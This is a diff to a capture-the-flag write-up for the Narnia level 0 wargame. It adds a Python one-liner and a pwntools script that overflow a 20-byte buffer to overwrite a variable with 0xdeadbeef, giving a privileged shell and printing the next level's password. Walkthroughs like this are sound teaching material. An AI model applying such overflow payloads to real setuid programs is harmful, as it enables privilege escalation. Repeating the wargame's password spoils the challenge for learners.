@@ -1,7 +1,7 @@
 Introduction
 ============
 
-There are to files related to this level.
+There are two files related to this level.
 The first one is named ```/narnia/narnia0```. It's a [setuid](https://en.wikipedia.org/wiki/Setuid) binary which we obviously have to [exploit](https://en.wikipedia.org/wiki/Exploit_(computer_security)) in order to gain access to the next level:
 
 ```
@@ -85,7 +85,7 @@ Since we are too lazy to (repeatedly) type 10 or more characters, we [pipe](http
 ```
 narnia0@narnia:~$ python -c 'print "B"*10' | /narnia/narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAA
+Here is your chance: buf: BBBBBBBBBB
 val: 0x41414141
 WAY OFF!!!!
 ```
@@ -93,16 +93,15 @@ WAY OFF!!!!
 What we can see ist that the char array ```buf[20]``` now contains 10 times the letter 'B' while the value of variable ```val``` remains 0x41414141. That's what we expected so far. 
 Just a side note: The term ```0x41``` has a special meaning in cyber security. 0x41 is the [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal) representation of the letter 'A' as described in the [ASCII](https://en.wikipedia.org/wiki/ASCII) character encoding standard. The letter 'A' or its hexadecimal expression 0x41 are used to fill buffers in order to analyze a program's flow like we previously did. Using an 'A' or 0x41 is just some kind of a [convention](https://security.stackexchange.com/questions/18680/why-is-0x41414141-associated-with-security-exploits) because people found out that filling buffers with a sequence of identical characters simplifies looking for them in process memory later on. Since the pre-assigned value of ```val``` already contains a sequence of A's and therefore a sequence of 0x41's, we decided to fill the buffer ```buf``` with a sequence of the letter 'B' which is 0x42 in hexadecimal. This enables us to differenciate between the contents of the variable ```val``` and the contents of buffer ```buf[20]```. Let's open the program in the GNU Debugger (gdb) in order to visualize this behavior:
 
-
-
 The expectation is that if we enter exactely these 20 characters, the buffer ```buf[20]``` gets filled with the characters and everything is fine.
 
-narnia0@narnia:~$ python -c 'print "A"*20' | /narnia/narnia0
+```
+narnia0@narnia:~$ python -c 'print "B"*20' | /narnia/narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBB
 val: 0x41414100
 WAY OFF!!!!
-
+```
 
 Solution
 ========
@@ -116,4 +115,49 @@ id
 uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
 cat /etc/narnia_pass/narnia1
 efeidiedae
+```
+
+Alternative using Python:
+```
+narnia0@narnia:~$ (python -c 'print "B"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
+val: 0xdeadbeef
+id
+uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
+cat /etc/narnia_pass/narnia1
+efeidiedae
+```
+
+Alternative using pwntools:
+
+Copy the following code into a file named ```/tmp/exploit0.py```.
+
+```
+from pwn import *
+
+context.update(arch='i386', os='linux')
+
+payload  = cyclic(cyclic_find(0x61616166))
+payload += p32(0xdeadbeef)
+print(payload)
+
+p = process("/narnia/narnia0")
+p.sendline(payload)
+p.interactive()
+```
+Execute the previously created Python code:
+```
+narnia0@narnia:~$ python /tmp/exploit0.py
+aaaabaaacaaadaaaeaaaﾭ�
+[+] Starting local process '/narnia/narnia0': pid 1295
+[*] Switching to interactive mode
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: aaaabaaacaaadaaaeaaaﾭ�
+val: 0xdeadbeef
+$ id
+uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
+$ cat /etc/narnia_pass/narnia1
+efeidiedae
+$ exit
 ```
